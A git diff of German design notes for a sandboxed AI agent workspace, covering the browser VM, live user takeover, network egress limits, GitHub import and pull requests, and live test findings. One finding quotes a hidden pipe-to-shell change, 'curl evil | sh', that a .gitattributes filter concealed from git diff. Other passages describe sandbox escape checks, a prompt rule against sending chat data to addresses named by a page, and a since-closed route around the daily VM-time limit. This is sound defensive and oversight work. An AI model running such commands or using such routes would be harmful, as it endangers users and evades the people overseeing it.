-  Keysym, sonst `0x01000000 | Codepoint`, Zeilenumbruch als Return,
-  Zeilenumbrüche am Ende fallen weg), höchstens `PASTE_MAX` = 2.000 Zeichen.
-  Vorher lässt es Shift, Strg, Meta, Alt und Super in der VM los. Nie über die
-  Zwischenablage der VM (`clipboardPasteFrom`), denn dort bliebe das Passwort
-  für den Agenten liegen. So kommt ein Passwort aus dem eigenen
-  Passwortmanager in die Seite und nirgends sonst hin. Die Tastenkombination
-  erreicht noVNC nie (Capture-Listener am Bildschirm, `stopPropagation`).
-  Der Browser fügt in ein verstecktes Feld ein
-  (`.workspace-view-paste-target`, 16 px gegen den iOS-Zoom), dessen
-  `paste`-Ereignis tippt den Text ein und gibt den Fokus ans Bild zurück.
-  Geprüft 2026-10-27 in Chromium mit einem nachgebauten noVNC (echte Tasten,
-  echtes `ClipboardEvent`) und an einer echten Sprite: Dieselbe Tastenfolge
-  über Gateway und x11vnc, mit noch gedrückter Strg-Taste vom Kürzel, kam
-  als `Pa$$wörd-42€ Ä@\ ~|{}ß` genau so im Feld an.
-- **Pause an einer echten Sprite geprüft** (2026-10-27, eigene Test-Sprite,
-  ohne Firestore): Ein Hintergrundprozess und ein laufender Befehl stehen
-  (Zustand `T`), Chrome, Xvfb, x11vnc und Gateway laufen weiter, Chrome ohne
-  Marke. Tippen des Nutzers kommt an. Nach dem Zurückgeben und nach dem Ablauf
-  (ohne Zurückgeben) laufen sie weiter, der Befehl endet normal.
+  „Paste“ den Text als Tastendrücke ein (`rfb.sendKey`), höchstens
+  `PASTE_MAX` = 2.000 Zeichen, nie über die Zwischenablage der VM. So kommt ein
+  Passwort aus dem eigenen Passwortmanager in die Seite und nirgends sonst hin.
 - **Überall abmelden** (`POST /agent/workspace/reset-browser`, nach
-  Rückfrage): beendet Chrome und löscht das Profil, nie während ein Chat den
-  Arbeitsplatz nutzt (409 `running`).
-- **Gemessen 2026-10-27** an einer eigenen Test-Sprite (Ubuntu 26.04, 8 CPU,
-  16 GB): Setup 67 s einmalig, `browser read` 0,8 s, `prepare` bei neuer
-  Version 7,5 s, Gateway bis zum VNC-Bild 0,6–1 s über die private Adresse;
-  Klicks und echte Tastendrücke aus der Ansicht kommen in Chrome an, die
-  Aktionen des Agenten erscheinen live.
+  Rückfrage): beendet Chrome auf der Browser-VM und löscht dort Profil und
+  Upload-Ordner, nie während ein Chat den Arbeitsplatz nutzt (409 `running`).
+  Setzt vorher die Untergrenze für Restores (alte Checkpoints der Werkbank
+  enthalten noch das Profil der Zeit vor dem Umbau).
+
+#### Live geprüft an eigenen Test-Sprites (2026-10-27)
+
+Acht Läufe mit `SpritesBackend`, `agent_workspace.prepare` und den Skripten
+dieser Version gegen frische Test-Sprites (`consens-test-…`, nie
+Nutzer-Sprites, jede danach gelöscht; Skript `live_check.py` im Scratchpad
+der Session), dazu drei kleine Sonden (Laufzeit-Shims, Ports, x11vnc):
+
+- **Migration:** alte Ordner, Notizen und Repos in `/home/agent` (agent:agent),
+  altes Browser-Profil gelöscht, `prepare` 1,6–4,4 s, beim zweiten Mal ein
+  Lesezugriff.
+- **Fund 1 (Token und Gateway):** Die Ansicht verbindet sich mit
+  `wss://api.sprites.dev/v1/sprites/<browser>/exec`; `connect_upstream`
+  verweigert die Adresse der VM. Die Browser-VM hat keinen Dienst
+  (`GET …/services` → `[]`). Das Relay meldet `starting`, `ready`, dann kam
+  `RFB 003.008` vom VNC-Server über dessen Unix-Socket und auf die
+  Versionsantwort seine Sicherheitstypen (0,6–0,8 s nach eingerichtetem
+  Browser).
+- **Fund 2 (Browser getrennt):** Auf der Werkbank lauscht nichts
+  (`ss -ltn` leer), Chrome und CDP gibt es dort nicht mehr. Auf der
+  Browser-VM lauscht nur CDP auf 127.0.0.1, VNC hat keinen TCP-Port (nur den
+  Unix-Socket, `srwxr-xr-x sprite`). Die Sprite spiegelt keine Ports: Ein
+  Dienst auf 127.0.0.1 ist über `fdf::1` nicht erreichbar (Sonde). Der
+  Helfer: der erste Aufruf richtet den Browser in einem Zug ein und öffnet
+  die Seite (54–73 s), danach `read` (0,8–1,2 s), `click` (2,7 s), `tabs`,
+  `screenshot` (100 KB PNG) und Tippen in einen veralteten Ref (verweigert);
+  ein Passwortfeld zeigt `(empty)` und nimmt keinen Text; ein Upload-Pfad
+  außerhalb des Upload-Ordners wird verweigert; bei Übernahme `status: user`.
+- **Fund 3 (Pause):** Agenten-Prozesse, auch einer mit leerer Umgebung,
+  stehen während der Übernahme (cgroup `frozen 1`, der Zähler steht) und
+  laufen nach dem Zurückgeben weiter.
+- **Fund 4 (Netz):** Als Agent `pypi.org` 200, `example.com`, `github.com`,
+  `api.sprites.dev` DNS-gesperrt, `1.1.1.1` gesperrt. Nach `set_policy` mit
+  `example.com` sofort 200, nach dem Zurücksetzen wieder gesperrt.
+  `vm_install_packages jq` als root in 3–4 s; als Agent laufen `python3`,
+  `pip install` (nach `~/.local`), `node`, `go`, `uv tool install`.
+- **Agenten-Nutzer:** uid 1500, `NoNewPrivs: 1`, alle Capabilities 0, `sudo`
+  verweigert, `su` scheitert. `api.sock` ist im Namespace `/dev/null`,
+  `/.sprite/checkpoints` und `/.sprite/logs` leer; ein eigener
+  User-Namespace (`unshare -r`) kann die Abdeckung nicht lösen („not
+  mounted“). `/home/sprite` nicht lesbar, der Wrapper nicht schreibbar (auch
+  nicht über `vm_write_file`), `/etc/shadow` nicht lesbar, keine Blockgeräte.
+  Dateien, die der Agent schreibt, gehören `agent:agent`.
+- **Fund 5 (PR-Diff aus den Bytes, ca5097af):** In einem Repo, dessen
+  `.gitattributes`-Filter git eine Änderung verschweigen ließ
+  (`git diff` leer), nannte git nur `.gitattributes`; der Diff des Backends
+  aus den gelesenen Bytes zeigte die echte Änderung (`-safe` / `+curl evil |
+  sh`). Was nicht in der Liste steht, geht nicht hoch; was hochgeht, ist
+  genau das, was die Karte zeigt.
+- **Gefunden und behoben dabei:** Laufzeit-Shims brauchten ihre Zeilen in
+  `languages_env` (jetzt in `setup.sh`), npm-`prefix` störte nvm (entfernt),
+  die Browser-Einrichtung fror im Hintergrund ein (jetzt synchron), ein
+  Exec-Handshake brach beim Aufwachen ab (jetzt einmal wiederholt; im
+  sechsten Lauf griff die Wiederholung), x11vnc band IPv6 (jetzt nur
+  Unix-Socket), Playwright fehlte direkt nach der ersten Einrichtung im
+  laufenden Python (Nutzer-Site nachgeladen).
 
 **Arbeitsstand über Nachrichten (seit 2026-10-26).** Frühere Nachrichten
 erreichen den Agenten sonst nur als Frage und Antwort. Ein Turn, in dem die VM
@@ -783,17 +919,14 @@ startete, speichert keins.
 
 **Keine Geheimnisse in der VM.** Kein Befehl bekommt Umgebungsvariablen aus
 dem Backend, `SPRITES_TOKEN` steht nur im Header der Anfragen von
-`agent_vm.py`, Gmail und Kalender bleiben Backend-Werkzeuge mit Bestätigung.
-Ausgehend erreicht die VM seit 2026-10-26 das offene Web (`EGRESS_RULES`:
-`*.internal` und `*.flycast` gesperrt, also Flys internes Netz, sonst `*`
-erlaubt; die Sprites-Policy kennt nur Domains, keine IP-Bereiche). Vorher nur
-die Standardziele des Anbieters (Paketquellen, KI-APIs). Damit fällt die
-technische Sperre gegen Datenabfluss weg: Der Prompt verbietet, Dateien und
-Daten des Chats an Adressen zu schicken, die nur eine Seite, Datei oder
-Ausgabe nennt, und die Prüfer sehen jeden Befehl live (später mit Aussteuerung).
-Bekanntes Restrisiko: Über den Management-Socket in der VM
-(`/.sprite/api.sock`, Tasks API) kann ein Befehl die Sprite bis zu einer Stunde
-je Task wach halten (Kosten), am Tageskonto vorbei.
+`agent_vm.py` an `api.sprites.dev` (seit 2026-10-27 auch die Live-Ansicht,
+vorher ging er an die Adresse der VM), Gmail und Kalender bleiben
+Backend-Werkzeuge mit Bestätigung. Das Netz der Werkbank ist seit 2026-10-27
+zu bis auf die Paketquellen (siehe „Netz der Werkbank“); vom 2026-10-26 bis
+dahin erreichte sie das offene Web. Den Management-Socket
+(`/.sprite/api.sock`, Tasks API, Checkpoints, Dienste) erreicht der Agent
+nicht mehr (Mount-Namespace in `agent-run`), also auch nicht mehr die
+Tasks-Sperre am Tageskonto vorbei.
 
 **VM-Zeit pro Tag (seit 2026-10-26).** Eine Sprite kostet nur, solange sie läuft
 (Fly.io rechnet CPU und Speicher nach Laufzeit ab, warm oder kalt nichts), und
@@ -924,9 +1057,13 @@ Schritten ist Einleitung, der Lauf geht weiter; der
 Arbeitsstand der nächsten Nachricht nennt den Stand („update_plan: 3 of 4
 steps done, now: …“).
 
-**GitHub aus der VM (seit 2026-10-26, mehrnutzerfähig).** Öffentliche Repos
-klont der Agent selbst (`git clone`, GitHub ist im Egress erlaubt). Private
-Repos und Pull Requests laufen über eine **öffentliche GitHub-App**, die jeder
+**GitHub aus der VM (seit 2026-10-26, mehrnutzerfähig).** Seit 2026-10-27
+erreicht die Werkbank github.com nicht (Netz zu); jedes Repository kommt über
+`github_import`, ein öffentliches auch ohne Verbindung und ohne Token
+(`GitHubTools._public`: `GET /repos/{repo}` ohne Anmeldung, nur bei
+`private: false`, dann Tarball über api.github.com; 60 Anfragen je Stunde
+und IP). Private Repos und Pull Requests laufen über eine **öffentliche
+GitHub-App**, die jeder
 Nutzer selbst auf Repositories seiner Wahl installiert (`agent_github.py`,
 Router `routers/agent_github.py`, Browser `agent-github.js`; Einrichtung der
 App: `docs/github-app-setup.md`). Konfiguration: `GITHUB_APP_ID`,
@@ -972,7 +1109,8 @@ Installation fällt aus der Verbindung; danach „not connected“. Kein Webhook
 Default-Branch) zum Commit auf, lädt dessen Tarball (höchstens 50 MB gepackt;
 die Weiterleitung zu codeload trägt ihr eigenes Kurzzeit-Token,
 `Authorization` geht nur an api.github.com), schreibt ihn in die VM und packt
-ihn nach `/home/sprite/repos/<name>` aus, als Git-Repo mit einem Commit (unter
+ihn als Agenten-Nutzer nach `/home/agent/repos/<name>` aus (vor 2026-10-27
+`/home/sprite/repos`), als Git-Repo mit einem Commit (unter
 `refs/consens/import`, `IMPORT_REF`) und `.git/consens-import.json` (Repo, Ref,
 Commit). Ein vorhandener Ordner wird nie überschrieben.
 
@@ -1006,7 +1144,9 @@ unübersetzt; Bestätigungsfrist 60 min. Erst „Create pull request“
 (`POST /agent/chats/{chat}/turns/{turn}/pull-request` mit `expected_hash`)
 schickt etwas zu GitHub: `PullRequests.confirm` beansprucht den Vorschlag
 einmal (`pending` → `executing`), liest die Dateien erneut aus der VM und
-bricht ab, wenn eine vom Vorschau-Hash abweicht, legt Blobs, Tree (auf dem Tree
+bricht ab, wenn eine vom Vorschau-Hash abweicht (gelesen als Agenten-Nutzer,
+ohne die VM neu anzulegen, sonst setzte `ensure` ihre Netzregeln zurück),
+legt Blobs, Tree (auf dem Tree
 des importierten Commits, gelöschte Dateien mit `sha: null`), Commit (Eltern:
 der importierte Commit), den neuen Branch und den Pull Request an und speichert
 Nummer und Link (`succeeded`) oder den Fehler (`failed`). Ein bestehender
@@ -1014,15 +1154,21 @@ Branch wird nie geändert, nie direkt auf main gepusht. „Discard“
 (`…/pull-request/discard`) setzt `discarded`. Der Link der Karte führt nur zu
 `https://github.com/…`.
 
-**Anbieter-Schnittstelle** (`agent_vm.py`): `VMBackend` mit `ensure`, `exec`,
-`read_file`, `write_file`, `checkpoint`, `delete`, `close`; `SpritesBackend`
-spricht REST über `httpx` (Sprite, Dateien `fs/read`/`fs/write`,
+**Anbieter-Schnittstelle** (`agent_vm.py`): `VMBackend` mit `exists`,
+`ensure(name, rules)`, `set_policy`, `run` (argv wie gegeben, optional stdin),
+`exec` (Shell-Befehl über `wrapped_command`), `exec_url`, `read_file`,
+`write_file`, `delete_path` (die drei mit `agent=True` als Agenten-Nutzer,
+`agent=False` für den Server in seinem eigenen Home), `delete_service`,
+`checkpoint`, `restore`, `delete`, `close`; `SpritesBackend` spricht REST über
+`httpx` (Sprite, Dateien `fs/read`/`fs/write` nur für den Server,
 Netzwerkregeln, Checkpoints als NDJSON, die ID per Kommentar aus der Liste)
-und Befehle über das exec-WebSocket (`websockets`, Frames `0x01` stdout,
-`0x02` stderr, `0x03` Exit-Code). Das HTTP-exec streamt dieselben Frames ohne
-Längen und hängt an unveränderten Chunk-Grenzen (warnt auch Sprites' JS-SDK),
-deshalb das WebSocket. Stop schließt den Socket und beendet den Befehl in der
-VM (`exec/{session}/kill`). Ein Wechsel zu E2B betrifft nur diese Datei.
+und Befehle über das exec-WebSocket (`websockets`, Frames `0x00` stdin und
+`0x04` dessen Ende zur VM, `0x01` stdout, `0x02` stderr, `0x03` Exit-Code
+zurück). Ein abgebrochener Handshake (Sprite wacht auf, gesehen 2026-10-27)
+wird einmal wiederholt. Das HTTP-exec streamt dieselben Frames ohne Längen und
+hängt an unveränderten Chunk-Grenzen (warnt auch Sprites' JS-SDK), deshalb das
+WebSocket. Stop schließt den Socket und beendet den Befehl in der VM
+(`exec/{session}/kill`). Ein Wechsel zu E2B betrifft nur diese Datei.
 
 **Fehler kosten Werkzeuge, nie die Antwort.** Jeder Ausfall des Anbieters ist
 `VMUnavailable` (jede 2xx-Antwort gilt als Erfolg, die Netzwerkregel antwortet
@@ -1066,12 +1212,15 @@ Die Zeitleiste zeigt weiter jeden Schritt. Der Browser spricht nie mit der Sprit
 Ordner im Arbeitsplatz und immer auch seine alte eigene VM, deren Name aus dem
 Chat folgt (`agent_vm.delete_chat_vm`, `vm_name`; 404 ist in Ordnung): Mit
 dem Umzug in den Arbeitsplatz verlor der Datensatz diesen Namen, und die VM
-blieb stehen (Sicherheitsaudit 2026-10-27). Scheitert der Anbieter, bleibt der
-Lösch-Job und versucht es erneut. Ein Chat ohne VM fragt den Anbieter nie.
-Die Kontolöschung löscht den Arbeitsplatz über den Namen aus der UID
-(`agent_workspace.delete_for_account`), erst danach den Datensatz; vorher
-endete sie bei fehlendem Datensatz, und den räumte ein späterer Bereich nach
-einem gescheiterten Anbieter-Aufruf schon ab.
+blieb stehen (Sicherheitsaudit 2026-10-27). Den Ordner löscht seit dem Umbau
+der Agenten-Nutzer (vorher `prepare`, falls die Werkbank noch die alte
+Version hat; eine Werkbank, die es nicht gibt, wird dafür nicht angelegt),
+dazu den alten Ort `/home/sprite/chats/<chat>` über die Datei-API. Scheitert
+der Anbieter, bleibt der Lösch-Job und versucht es erneut. Ein Chat ohne VM
+fragt den Anbieter nie. Die Kontolöschung löscht Werkbank und Browser-VM über
+die Namen aus der UID (`agent_workspace.delete_for_account`), erst danach den
+Datensatz; vorher endete sie bei fehlendem Datensatz, und den räumte ein
+späterer Bereich nach einem gescheiterten Anbieter-Aufruf schon ab.
 
 Voraussetzung live: `SPRITES_TOKEN` im Backend (lokal in `.env`, auf Render
 als Umgebungsvariable). Ohne Token sagt das erste VM-Werkzeug „not
@@ -1080,7 +1229,13 @@ Datenschutzerklärung.
 
 Tests: `tests/test_agent_vm.py` (Fake-VM für Turn, Wiederverwendung,
 Checkpoints, Anhänge, Ausfälle, Grenzen, Kürzung, Route, Löschung;
-`SpritesBackend` gegen `httpx.MockTransport` und einen Fake-Socket),
+`SpritesBackend` gegen `httpx.MockTransport` und einen Fake-Socket, Dateien
+des Agenten nie über die Datei-API), `tests/test_agent_browser.py`
+(Werkzeug `browser`: typisierte Aktionen, Adressen, Upload, Screenshot,
+Ausfall), `tests/test_agent_domains.py` (Domains pro Chat, Policy live),
+`tests/test_agent_workspace.py` (Sperre, Skripte der VMs, Pause per Nutzer und
+cgroup, Relay, Löschung), `tests/test_agent_workspace_view.py` (Live-Ansicht
+über die Exec-API), `tests/test_agent_gate.py` (Vorab-Prüfung, Domain-Karte),
 `tests/test_agent_long_runs.py` (Grenzen langer Läufe, Wrap-up vor Konto- und
 Fensterende, Kompaktierung, Aktivitätsgröße),
 `tests/test_agent_github.py` (Verbinden nur mit GitHubs eigener Liste, Cookie
